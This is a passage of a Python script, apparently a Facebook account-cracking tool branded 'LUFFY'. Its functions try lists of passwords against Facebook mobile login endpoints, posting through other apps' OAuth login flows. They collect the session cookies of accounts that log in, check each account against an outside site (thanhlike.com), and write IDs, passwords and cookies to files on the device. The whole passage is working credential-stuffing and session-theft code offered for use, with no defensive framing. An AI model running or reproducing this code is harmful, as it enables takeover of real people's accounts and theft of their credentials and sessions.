            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=3618539641590455&kid_directed_site=0&app_id=3618539641590455&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D3618539641590455%26cbt%3D1696752891275%26e2e%3D%257B%2522init%2522%253A1696752891275%257D%26ies%3D1%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D26963441-e2bf-496f-97bf-2c6623861aed%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.netease.partyglobal%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DbZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De971aba2-6f14-44d0-98d3-44be37e9c6c8%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.netease.partyglobal%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Infinix X6831"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': XC,
            'viewport-width': '393',
            'x-asbd-id': '129477',
            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream'
            }
            url = "https://m.facebook.com/login/device-based/login/async/?api_key="+"3618539641590455"+"&auth_token=cd7144df4d1bed13d2a83ff8c5ce610c&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D3618539641590455%26cbt%3D1696752891275%26e2e%3D%257B%2522init%2522%253A1696752891275%257D%26ies%3D1%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D26963441-e2bf-496f-97bf-2c6623861aed%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.netease.partyglobal%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DbZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De971aba2-6f14-44d0-98d3-44be37e9c6c8%26tp%3Dunspecified&refsrc=deprecated&app_id=3618539641590455&cancel=fbconnect%3A%2F%2Fcct.com.netease.partyglobal%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D&lwv=100"
            session.post(url,data=data,headers=head,allow_redirects=False,proxies=proxs).text
            q = session.cookies.get_dict().keys()
            if 'c_user' in q:
                cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idx = re.findall('c_user=(.*);xs', cookie)[0]
                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idx}"
                res = requests.get(ckk).text
                if 'live' in res:
                    oks.append(sid)
                    print('\r\r\033[1;32m [OK]>) '+idx+' | '+pas)
                    open('/sdcard/LUFFY-R-OK.txt','a').write(idx+'|'+pas+'\n')
                    open('/sdcard/LUFFY-R-COOKIE-OK.txt','a').write(idx+'|'+pas+'|'+cookie+'\n')
                    print(f"\r\r\033[1;35m <[🍪]>\033[1;37m {cookie}")
                    break
                else:pass
            elif 'checkpoint' in q:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m <[LUFFY-CP]> '+uid+' | '+pas)
                cps.append(sid)
                open('/sdcard/LUFFY-R-CP.txt','a').write(uid+'|'+pas+'\n')
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#═════════════════════════════════════════#
def ___normal4___(sid,pwx,sl):
    try:
        global oks,cps,loop
        clr = random.choice(["\x1b[38;5;208m","\033[1;30m","\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m","\033[1;37m"])
        sys.stdout.write(f'\r\r\033[1;37m <[{clr}LUFFY-XD\033[1;37m]>×<[{loop}|\033[1;32m{len(oks)}\033[1;37m]> \033[1;37m');sys.stdout.flush()
        for pws in pwx:
            session=requests.Session()
            pas = rmpassconf(sid,pws)
            ua = random.choice(ugen)
            link = session.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1931338333744719&kid_directed_site=0&app_id=1931338333744719&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D1931338333744719%26auth_type%26cbt%3D1709361645959%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9697b25c513fe286%2526domain%253Dphotoclub.canadiangeographic.ca%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fphotoclub.canadiangeographic.ca%25252Ff1103b835a77a17ed%2526relation%253Dopener%26client_id%3D1931338333744719%26config_id%26display%3Dtouch%26domain%3Dphotoclub.canadiangeographic.ca%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fphotoclub.canadiangeographic.ca%252F%26force_confirmation%3Dfalse%26id%3Dfad69a9d646684af1%26locale%3Den_US%26logger_id%3D57762c20-1242-493a-8f06-c6c935dc80ef%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfa8803a6ce1cae6f7%2526domain%253Dphotoclub.canadiangeographic.ca%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fphotoclub.canadiangeographic.ca%25252Ff1103b835a77a17ed%2526relation%253Dopener.parent%2526frame%253Dfad69a9d646684af1%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfa8803a6ce1cae6f7%26domain%3Dphotoclub.canadiangeographic.ca%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fphotoclub.canadiangeographic.ca%252Ff1103b835a77a17ed%26relation%3Dopener.parent%26frame%3Dfad69a9d646684af1%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr&is_from_native_app=true")
            data = {
            "jazoest": re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
            "lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
            "m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
            "li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),
            "email": sid,
            "pass": pas,
            "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pas),
            "try_number": "0",
            "unrecognized_tries": "0",
            "prefill_source": "browser_dropdown",
            "prefill_type": "password",
            "first_prefill_source": "browser_dropdown",
            "first_prefill_type": "contact_point",
            "had_cp_prefilled": "true",
            "had_password_prefilled": "true",
            "is_smart_lock": "false",
            "bi_xrwh": "0",
            "__dyn": "1KQeskNZkRliltq7unmlGQWbLzktgXsUXwzwXO40N5epBIfbCxLrlD01VOqdAD6bm82seN6-d28pI3cNZ3V2sFhmescH_SiVwCJnQW0iW220jG3qaw4kwbS1Lw9C0hO3q0ue",
            "__req": "5",
            "__a": "AYaoE_Y0WqvvMWkL3sr-XkNMp2tYKUuZmSQuEgBtFsq6lrLX5D7HN6Uxuq0dW5ZfQXOIS-Cr2aoOCrz4PZmTRvYObhPA1q_I1xCqFRy5uGwpFa",
            "__user": "0"
            }
            head = {
            "User-Agent": ua,
            "authority": "mobile.facebook.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://"+"m.facebook.com"+"",
            "referer": "https://"+"m.facebook.com"+"/",
            "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site"
            }
            url = "https://m.facebook.com/login/device-based/regular/login/?api_key=1931338333744719&auth_token=8faf5a8c76b759da2ab806abfbe00524&skip_api_login=1&signed_next=1&next=https://m.facebook.com/v13.0/dialog/oauth?app_id=1931338333744719&auth_type&cbt=1709361645959&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df9697b25c513fe286%26domain%3Dphotoclub.canadiangeographic.ca%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fphotoclub.canadiangeographic.ca%252Ff1103b835a77a17ed%26relation%3Dopener&client_id=1931338333744719&config_id&display=touch&domain=photoclub.canadiangeographic.ca&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fphotoclub.canadiangeographic.ca%2F&force_confirmation=false&id=fad69a9d646684af1&locale=en_US&logger_id=57762c20-1242-493a-8f06-c6c935dc80ef&messenger_page_id&origin=2&plugin_prepare=true&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfa8803a6ce1cae6f7%26domain%3Dphotoclub.canadiangeographic.ca%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fphotoclub.canadiangeographic.ca%252Ff1103b835a77a17ed%26relation%3Dopener.parent%26frame%3Dfad69a9d646684af1&ref=LoginButton&reset_messenger_state=false&response_type=signed_request%2Ctoken%2Cgraph_domain&scope=email%2Cpublic_profile&sdk=joey&size=%7B%22width%22%3Anull%2C%22height%22%3Anull%7D&url=dialog%2Foauth&version=v13.0&ret=login&fbapp_pres=0&tp=unspecified&refsrc=deprecated&app_id=1931338333744719&cancel=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#cb=fa8803a6ce1cae6f7&domain=photoclub.canadiangeographic.ca&is_canvas=false&origin=https%3A%2F%2Fphotoclub.canadiangeographic.ca%2Ff1103b835a77a17ed&relation=opener.parent&frame=fad69a9d646684af1&error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&lwv=100&locale2=en_GB"
            session.post(url,data=data,headers=head,allow_redirects=False).text
            q = session.cookies.get_dict().keys()
            if 'c_user' in q:
                cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idx = re.findall('c_user=(.*);xs', cookie)[0]
                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idx}"
                res = requests.get(ckk).text
                if 'live' in res:
                    oks.append(sid)
                    print('\r\r\033[1;32m <[LUFFY-OK]> '+idx+' | '+pas)
                    open('/sdcard/LUFFY-R-OK.txt','a').write(idx+'|'+pas+'\n')
                    open('/sdcard/LUFFY-R-COOKIE-OK.txt','a').write(idx+'|'+pas+'|'+cookie+'\n')
                    print(f"\r\r\033[1;32m <[🍪]>\033[1;37m {cookie}")
                    #__JOIN__GROUP__(cookie)
                    break
                else:pass
            elif 'checkpoint' in q:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m <[LUFFY-CP]> '+uid+' | '+pas)
                cps.append(sid)
                open('/sdcard/LUFFY-R-CP.txt','a').write(uid+'|'+pas+'\n')
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#═════════════════════════════════════════#
def ___normal5___(sid,pwx,sl):
    try:
        global oks,cps,loop
        clr = random.choice(["\x1b[38;5;208m","\033[1;30m","\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m","\033[1;37m"])
        sys.stdout.write(f'\r\r\033[0m\033[1;31m• \033[1;32mLUFFY-R5\033[1;31m >>\033[1;31m \033[1;35m[\033[1;32mCRACKING\033[1;35m>{loop}\033[1;35m>\033[1;32mOK>{len(oks)}\033[1;35m]');sys.stdout.flush()
        for pws in pwx:
            session=requests.Session()
            pas = rmpassconf(sid,pws)
            ua = random.choice(ugen)
            link = session.get("https://m.facebook.com")
            data = {
            "lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
            "jazoest": re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
            "m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
            "li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),
            "try_number": "0",
            "unrecognized_tries": "0",
            "email": sid,
            "pass": pas,
            "login": "Log In"
            }
            head = {
            "authority": "m.facebook.com",
            "method": "POST",
            "scheme": "https",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "max-age=0",
            "referer": "https://m.facebook.com/?wtsid=rdr_0EVZc4NpTe3mbn34N",
            "sec-ch-prefers-color-scheme": "light",
            "sec-ch-ua": "\"(Not(A:Brand\";v=\"99\", \"Chromium\";v=\"115\", \"Google Chrome\";v=\"115\"",
            "sec-ch-ua-full-version-list": "\"(Not(A:Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"115.0.5844.212\", \"Google Chrome\";v=\"115.0.5844.212\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua-platform-version": "\"\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": ua,
            "viewport-width": "980"
            }
            url = "https://m.facebook.com/login/device-based/login/async/?api_key=281257358716694&auth_token=84164ca10e580d8847aa35c526767318&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D281257358716694%26cbt%3D1696321674146%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ca3c4178a6c94%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%26client_id%3D281257358716694%26display%3Dtouch%26domain%3Dwww.klook.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.klook.com%252Fen-MY%252Faccount%252F%26locale%3Den_US%26logger_id%3Df"
            session.post(url,data=data,headers=head,allow_redirects=False).text
            q = session.cookies.get_dict().keys()
            if 'c_user' in q:
                cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idx = re.findall('c_user=(.*);xs', cookie)[0]
                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idx}"
                res = requests.get(ckk).text
                if 'live' in res:
                    oks.append(sid)
                    print('\r\r\033[1;32m <[LUFFY-OK]> '+idx+' | '+pas)
                    open('/sdcard/LUFFY-R-OK.txt','a').write(idx+'|'+pas+'\n')
                    open('/sdcard/LUFFY-R-COOKIE-OK.txt','a').write(idx+'|'+pas+'|'+cookie+'\n')
                    print(f"\r\r\033[1;32m <[🍪]>\033[1;37m {cookie}")
                    break
                else:pass
            elif 'checkpoint' in q:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m <[LUFFY-CP]> '+uid+' | '+pas)
                cps.append(sid)
                open('/sdcard/LUFFY-R-CP.txt','a').write(uid+'|'+pas+'\n')
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
def ___normal6___(sid,pwx,sl):
    try:
        global oks,cps,loop
        clr = random.choice(["\x1b[38;5;208m","\033[1;30m","\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m","\033[1;37m"])
        sys.stdout.write(f'\r\r\033[0m\033[1;31m• \033[1;32mLUFFY-R6\033[1;31m >>\033[1;31m \033[1;35m[\033[1;32mCRACKING\033[1;35m>{loop}\033[1;35m>\033[1;32mOK>{len(oks)}\033[1;35m]');sys.stdout.flush()
        for pws in pwx:
            session=requests.Session()
            pas = rmpassconf(sid,pws)
            ua = random.choice(ugen)
            link = session.get("https://m.facebook.com")
            data = {
            "lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
            "jazoest": re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
            "m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
            "li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),
            "try_number": "0",
            "unrecognized_tries": "0",
            "email": sid,
            "pass": pas,
            "login": "Log In"
            }
            head = {
            "authority": "m.facebook.com",
            "method": "POST",
            "scheme": "https",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "max-age=0",
            "referer": "https://p.facebook.com/?wtsid=rdr_0MX",
            "sec-ch-prefers-color-scheme": "light",
            "sec-ch-ua": "\"(Not(A:Brand\";v=\"99\", \"Chromium\";v=\"115\", \"Google Chrome\";v=\"115\"",
            "sec-ch-ua-full-version-list": "\"(Not(A:Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"115.0.5844.212\", \"Google Chrome\";v=\"115.0.5844.212\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua-platform-version": "\"\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "ua",
            "viewport-width": "980"
            }
            url = "https://m.facebook.com/login/device-based/login/async/?api_key=144117062837799&auth_token=4f68572762725b85380bb3322eb4f56b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fpixlr.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%26client_id%3D144117062837799%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D27279048-2ffa-4266-a587-1693d6522204%26tp%3Dunspecified&refsrc=deprecated&app_id=144117062837799&cancel=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%23_%3D_&lwv=1000"
            session.post(url,data=data,headers=head,allow_redirects=False).text
            q = session.cookies.get_dict().keys()
            if 'c_user' in q:
                cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idx = re.findall('c_user=(.*);xs', cookie)[0]
                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idx}"
                res = requests.get(ckk).text
                if 'live' in res:
                    oks.append(sid)
                    print('\r\r\033[1;32m [OK]> '+idx+' | '+pas)
                    open('/sdcard/LUFFY-R-OK.txt','a').write(idx+'|'+pas+'\n')
                    open('/sdcard/LUFFY-R-COOKIE-OK.txt','a').write(idx+'|'+pas+'|'+cookie+'\n')
                    print(f"\r\r\033[1;32m <[🍪]>\033[1;37m {cookie}")
                    break
                else:pass
            elif 'checkpoint' in q:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('\r\r\033[1;31m <[LUFFY-CP]> '+uid+' | '+pas)
                cps.append(sid)
                open('/sdcard/LUFFY-R-CP.txt','a').write(uid+'|'+pas+'\n')
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#═════════════════════════════════════
try:luffy()
except requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
except Exception as e:print(e)